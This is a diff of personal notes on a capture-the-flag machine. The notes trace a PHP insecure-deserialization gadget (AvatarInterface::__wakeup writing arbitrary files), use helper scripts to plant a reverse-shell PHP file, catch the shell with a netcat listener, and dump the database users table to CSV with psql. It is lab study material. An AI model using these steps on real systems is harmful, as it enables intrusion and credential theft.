@@ -92,57 +92,66 @@ $alert = "Account created. Please check your email for the activation link.";
 
 ![](/assets/2023-01-21-23-41-36.png)  
 
+## checking features
 
-# `/includes`
-## `img.php` 
-DONE, nothing to worry, this was the place were the security bypass was located
-
-## `header.php` 
-DONE, nothing here as well, just the output of some headers present on each of the pages.
-
-## `navbar.php`
-DONE, same as header but with navbar code. Theme function is present here.
-
-## `db_connect.php`
-WORKING: trying to connect to the db despite the fact that I am receiving php errors when running the command.
-pg_connect --> neverhteless I did not find/search this, it is not relevant since the port is closed and there is no luck whatsoever in checking the db despite having them credentials.
-
-
-# `var/www/html`
-
-## `register.php`
-
-- checking
-  - all fields are present
-  - password not too long 
-  - email valid
-  - check if user exists already
-  - check if email is already in use
-- invokes `generate_activation_code`
+- `get_theme()` unserializes `user-prefs` cookie. 
+- `UserPrefs` class is not too interesting. Nothing useful
+- `Avatar` and `AvatarInterface` has more to offer
 
 ```php
-function generate_activation_code() {
-    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
-    srand(time());
-    $activation_code = "";
-    for ($i = 0; $i < 32; $i++) {
-        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
     }
-    return $activation_code;
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
 }
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath; 
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+
 ```
 
+- `get_theme()`  gets called everywhere. e.g. `user.php`
+- `file_get_contents` probably is able to read from endpoint
+- built a server -->  `upload_server.py`
+
+## `upload_server.py`
+
+```sh
+$ python3 upload_server.py &
+$ python3 unsafe_unserialize.py /var/www/html/reverse_shell.php revshell
+```
+
+- check if file got uploaded 
+
+- open netcat
+```sh
+$ nc -lvnp 4444
+
+```
+we are in
+
+## `user`
 
 
-# utils.php
-- `generate_activation_code`
-- `rel_time`
-- theme related:
-  - `get_theme`
-  - `get_theme_class`
-  - `set_theme` 
 
-# once reversed 
+
+## once reversed 
+<br>
 
 - psql passwords, dump to csv
   - psql -h localhost -p 5432 -U dbuser -d broscience -c "\copy (SELECT * FROM users) TO '/var/www/html/users.csv' WITH CSV HEADER"
